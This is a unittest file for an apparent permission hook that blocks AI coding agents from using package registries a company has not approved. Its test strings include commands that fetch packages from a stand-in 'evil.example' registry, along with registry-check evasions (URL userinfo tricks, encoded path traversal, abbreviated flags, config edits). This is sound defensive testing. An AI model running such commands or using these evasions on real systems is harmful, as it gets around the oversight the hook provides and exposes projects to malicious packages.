    def test_an_unlisted_registry_fires_and_a_listed_one_does_not(self):
        self.assertEqual(self.effect("npm install --registry https://registry.npmjs.org/ left-pad"), "deny")
        self.assertEqual(self.effect("pip install -i https://pypi.org/simple x"), "deny")
        self.assertEqual(self.effect("pip install -i https://pypi.example.org/simple2 x"), "deny")
        self.assertEqual(self.effect("docker push ghcr.io/acme/app"), "deny")
        self.assertEqual(self.effect("npm install --registry $REGISTRY"), "deny")  # unknown: nothing covers it
        self.assertEqual(self.effect("npm install --registry https://npm.example.org/"), "none")
        self.assertEqual(self.effect("pip install -i https://pypi.example.org/simple/ x"), "none")
        self.assertEqual(self.effect("NPM_CONFIG_REGISTRY=https://npm.example.org npm ci"), "none")
        self.assertEqual(self.effect("npm install && pip install requests && docker pull ubuntu"), "none")
        self.assertEqual([e for e, _ in self.lines], ["deny"] * 5)  # one line per denied command, none for the others

    def test_every_registry_must_be_covered(self):
        self.assertEqual(self.effect("pip install -i https://pypi.example.org/simple --extra-index-url https://pypi.org/simple x"), "deny")

    def test_second_review_findings_fire(self):
        values = ("registry.npmjs.org", "registry.example.org/simple", "pypi.org/simple")
        for command in ("npm install -registry https://evil.example/ left-pad", "pip install --pypi-url https://evil.example/simple x",
                        "NPM_CONFIG_REGISTRY='https://registry.example.org/simple/.\t./x' npm install left-pad",
                        "pip config --timeout 30 set global.index-url https://evil.example/simple",
                        "uvx --no-build-isolation-package foo --index-url https://evil.example/simple ruff",
                        "npm config set -L user registry https://evil.example/",
                        "docker run --rm -it -v $(pwd):/app -w /app node:20 npm install"):  # the pinned known limit
            with self.subTest(command=command):
                self.assertEqual(self.effect(command, values=values), "deny")
        for command in ("npm install -registry https://registry.npmjs.org/ left-pad",
                        "pip install --pypi-url https://pypi.org/simple x",
                        'docker run --rm -it -v "$(pwd)":/app -w /app node:20 npm install'):
            with self.subTest(command=command):
                self.assertEqual(self.effect(command, values=values), "none")

    def test_the_readers_share_one_split(self):
        # A long command is split once for the deploy, registry and account readers, not once per kind.
        import catpilot_guard.deploy_targets as dt
        import catpilot_guard.registry_targets as rt
        calls = {"shared": 0, "deploy": 0}

        def counting(key, real):
            def wrapper(*args, **kwargs):
                calls[key] += 1
                return real(*args, **kwargs)
            return wrapper

        extra = ({"id": "hosts", "kind": "deploy_host", "mode": "block", "values": ["*.vercel.app"]},
                 {"id": "accounts", "kind": "cloud_account", "mode": "block", "values": ["aws:111122223333"]})
        with mock.patch.object(rt, "_simple_commands", counting("shared", rt._simple_commands)), \
                mock.patch.object(dt, "_simple_commands", counting("deploy", dt._simple_commands)):
            result = cr.decide(bash("npm install --registry https://registry.npmjs.org/ x && vercel --prod"), "claude-code",
                               policy(extra=extra))
        self.assertEqual(result["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertEqual(calls, {"shared": 1, "deploy": 0})

    def test_parser_differences_and_path_escapes_fire(self):
        # Review of PR #135: each of these reached a registry the rule does not list.
        values = ("registry.npmjs.org", "artifactory.example.com/api/npm/npm-approved", "pypi.example.org/simple")
        for command in ("npm install --registry 'https://evil.example\\@registry.npmjs.org/' left-pad",
                        "npm install --registry https://artifactory.example.com/api/npm/npm-approved/%2e%2e/npm-remote-all/ x",
                        "npm install --registry 'https://artifactory.example.com/api/npm/npm-approved/..\\npm-remote-all/' x",
                        "npm install --registry 'https://artifactory.example.com/api/npm/npm-approved/$UP/npm-remote-all/' x",
                        "pip install --ind https://pypi.org/simple x", "pip install -Ui https://pypi.org/simple x",
                        "python -mpip install -i https://pypi.org/simple x", "npm --reg=https://evil.example/ install x",
                        "uvx --index https://pypi.org/simple ruff", "uv run --no-project pip install -i https://pypi.org/simple x",
                        "docker run ghcr.io/evil/app", "pip config set global.index_url https://pypi.org/simple",
                        "echo https://evil.example | xargs npm install --registry"):
            with self.subTest(command=command):
                self.assertEqual(self.effect(command, values=values), "deny")
        for command in ("npm install --registry https://registry.npmjs.org/ left-pad",
                        "npm install --registry https://artifactory.example.com/api/npm/npm-approved/sub/ x",
                        "pip install --ind https://pypi.example.org/simple x"):
            with self.subTest(command=command):
                self.assertEqual(self.effect(command, values=values), "none")
        # Only a value with no path covers a URL path it cannot read.
        self.assertEqual(self.effect("npm install --registry https://artifactory.example.com/api/npm/npm-approved/%2e%2e/x/ y",
                                     values=("artifactory.example.com",)), "none")

    def test_modes_hosts_and_expiry(self):
        self.assertEqual(self.effect("npm publish --registry https://registry.npmjs.org", mode="monitor"), "none")
        self.assertEqual([(e, f["rule_id"], f["mode"]) for e, f in self.lines], [("would_deny", "package-registries", "monitor")])
        self.assertEqual(self.effect("npm publish --registry https://registry.npmjs.org", mode="ask"), "deny")
        self.assertEqual(self.effect("npm publish --registry https://registry.npmjs.org", mode="ask", ask=True), "ask")
        self.assertEqual(self.effect("npm publish --registry https://registry.npmjs.org", mode="ask", ask=True, host="codex"), "deny")
        self.assertEqual(self.effect("npm publish --registry https://registry.npmjs.org", mode="ask", ask=True,
                                     permission_mode="bypassPermissions"), "deny")
        self.assertEqual(self.effect("npm publish --registry https://registry.npmjs.org", mode="ask", ask=True, host="copilot-cli"), "ask")
        self.lines.clear()
        self.assertEqual(self.effect("npm publish --registry https://registry.npmjs.org", expires="2020-01-01"), "none")
        self.assertEqual([(e, f["mode"]) for e, f in self.lines], [("would_deny", "monitor")])

    def test_each_rule_is_its_own_allow_list(self):
        other = {"id": "more-registries", "kind": "package_registry", "mode": "monitor", "values": ["registry.npmjs.org"]}
        result = cr.decide(bash("npm install --registry https://registry.npmjs.org/ x"), "claude-code", policy(extra=(other,)))
        self.assertEqual(result["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertEqual([(e, f["rule_id"]) for e, f in self.lines], [("deny", "package-registries")])

    def test_the_reason_and_evidence_name_the_rule_never_the_registry(self):
        command = "npm publish --registry https://%s/%s/ && pip install -i https://%s/simple x" % (MARKER_HOST, MARKER_PATH, MARKER_HOST)
        result = cr.decide(bash(command), "claude-code",
                           policy(values=("%s/other" % MARKER_HOST, "npm.example.org"), use_instead="The internal package mirror"))
        reason = result["hookSpecificOutput"]["permissionDecisionReason"]
        self.assertIn("Catpilot company rule `package-registries`: this command names a package registry the company has not approved.", reason)
        self.assertIn("Use instead: The internal package mirror.", reason)
        for text in (MARKER_HOST, MARKER_PATH, "zq-marker", "npm.example.org", "npm publish", "pip", "registry.npmjs.org"):
            self.assertNotIn(text, reason)
        self.assertEqual(self.lines, [("deny", {"tool": "Bash", "rule_id": "package-registries", "mode": "block", "policy_sha256": "c" * 64})])

    def test_together_with_the_other_kinds(self):
        branch = {"id": "protected-branches", "kind": "protected_branch", "mode": "monitor", "values": ["main"]}
        hosts = {"id": "deploy-hosts", "kind": "deploy_host", "mode": "monitor", "values": ["*.vercel.app"]}
        result = cr.decide(bash("git push -f origin main && vercel --prod && npm publish --registry https://registry.npmjs.org"),
                           "claude-code", policy(extra=(branch, hosts)))
        self.assertEqual(result["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertEqual(sorted((e, f["rule_id"]) for e, f in self.lines), [("deny", "package-registries"), ("would_deny", "protected-branches")])


class HookProcessTests(unittest.TestCase):
    """The shim as the host runs it, with a package_registry policy: the decision, and an evidence log without the registry."""

    def test_denies_and_logs_content_free(self):
        with tempfile.TemporaryDirectory() as tmp:
            directory = Path(tmp) / "policy"
            directory.mkdir()
            os.chmod(directory, 0o755)
            path = directory / "company-policy.json"
            path.write_text(json.dumps({"format": "catpilot-company-policy", "format_version": 1, "source_sha256": "d" * 64,
                                        "expires_on": "2099-01-01", "rules": [
                                            {"id": "package-registries", "kind": "package_registry", "mode": "block",
                                             "values": ["%s/%s" % (MARKER_HOST, MARKER_PATH)]}]}), encoding="utf-8")
            os.chmod(path, 0o644)
            log = Path(tmp) / "evidence.jsonl"
            env = {k: v for k, v in os.environ.items() if not k.startswith("CATPILOT_EVIDENCE")}
            env["CATPILOT_EVIDENCE_LOG"] = str(log)
            command = "pip install -i https://%s/other-%s/ x" % (MARKER_HOST, MARKER_PATH)
            proc = subprocess.run([sys.executable, str(HOOK), "--host", "codex", "--policy", str(path)], input=json.dumps(bash(command)),
                                  capture_output=True, text=True, env=env, timeout=30)
            self.assertEqual(proc.returncode, 0, proc.stderr)
            self.assertEqual(json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecision"], "deny")
            (line,) = [json.loads(x) for x in log.read_text(encoding="utf-8").splitlines()]
            self.assertEqual((line["event"], line["rule_id"], line["mode"]), ("deny", "package-registries", "block"))
            self.assertNotIn("zq-marker", log.read_text(encoding="utf-8") + proc.stdout + proc.stderr)


class VerifyProbeTests(unittest.TestCase):
    """verify.sh's stdlib copy of the coverage, and its probes, agree with the hook (deploy/org/session_start_files.py)."""

    def setUp(self):
        self.helper = load_helper()

    def test_the_copy_of_the_coverage_agrees(self):
        values = ("npm.example.org", "registry.npmjs.org", "pypi.org", "pypi.org/simple", "pypi.org/simple/", "pypi.org/Simple",
                  "*.npmjs.org", "*.org", "*.pypi.org/simple", "registry.npmjs.org/x", "*.catpilot-verify.invalid",
                  "registry.catpilot-verify.invalid", "pypi.org/a//b")
        names = [name for _, name in self.helper.REGISTRY_PROBES] + ["pypi.org", "pypi.org/simple/x", "pypi.org/simple2",
                                                                      "a.registry.npmjs.org", "pypi.org/a/b/c"]
        for value in values:
            for name in names:
                with self.subTest(value=value, name=name):
                    self.assertEqual(self.helper.registry_covered(value, name), registry_covered(value, Target(REGISTRY, name)))

    def test_the_hook_reads_each_probe_as_the_helper_expects(self):
        for command, name in self.helper.REGISTRY_PROBES:
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, name)])

    def test_the_probe_falls_outside_the_first_rule(self):
        def probe(rules, expires="2099-01-01"):
            with tempfile.TemporaryDirectory() as tmp:
                path = Path(tmp) / "policy.json"
                path.write_text(json.dumps({"expires_on": expires, "rules": rules}), encoding="utf-8")
                return self.helper.first_registry_probe(path)

        rule = lambda rule_id, mode, values: {"id": rule_id, "kind": "package_registry", "mode": mode, "values": values}  # noqa: E731
        found = probe([rule("package-registries", "monitor", ["npm.example.org"])])
        self.assertEqual(found[0:2], ("package-registries", "monitor"))
        self.assertEqual(found[3:], (False, ["monitor"]))
        self.assertIn("registry.npmjs.org", found[2])
        found = probe([rule("r", "block", ["registry.npmjs.org", "pypi.org"]), rule("s", "ask", ["*.npmjs.org"]),
                       rule("t", "monitor", ["registry.catpilot-verify.invalid"])])
        self.assertIn("catpilot-verify.invalid", found[2])
        self.assertEqual(found[4], ["block", "ask"])  # t covers this probe, so its mode does not count
        self.assertEqual(probe([rule("r", "block", ["npm.example.org"])], expires="2020-01-01")[3:], (True, ["monitor"]))
        self.assertIsNone(probe([{"id": "b", "kind": "protected_branch", "mode": "block", "values": ["main"]}]))
        for command, _ in self.helper.REGISTRY_PROBES:  # the hook, not only the helper, reads it as outside the rule
            p = policy(values=("npm.example.org",))
            with mock.patch.object(cr, "record_evidence", lambda *a, **k: None):
                self.assertEqual(cr.decide(bash(command), "claude-code", p)["hookSpecificOutput"]["permissionDecision"], "deny")


if __name__ == "__main__":
    unittest.main()
